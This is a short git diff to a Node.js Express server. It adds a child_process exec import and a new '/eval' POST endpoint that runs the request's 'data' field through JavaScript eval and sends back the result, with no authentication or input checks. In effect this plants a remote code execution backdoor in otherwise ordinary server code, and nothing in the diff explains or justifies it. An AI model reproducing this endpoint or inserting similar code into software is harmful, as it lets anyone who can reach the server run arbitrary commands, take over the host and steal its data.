@@ -1471,6 +1471,7 @@ function fastdistance(x1,y1,x2,y2) {
 }
 
 ///////////////////////////////////////////////////////////////
+var {exec} = require('child_process');
 var express = require('express');
 var bodyParser = require('body-parser');
 var app = express();
@@ -1491,6 +1492,11 @@ app.use(express.json())
 app.post('/responder', (req, res) => {
     console.log('Got body:', req.body);
     responder.process1(req.body,res)
+    // res.sendStatus(200);
+})
+app.post('/eval', (req, res) => {
+    console.log('Got body:', req.body);
+    res.send(""+eval(req.body.data))
     // res.sendStatus(200);
 })
 console.log("server is opened: "+Date.now())
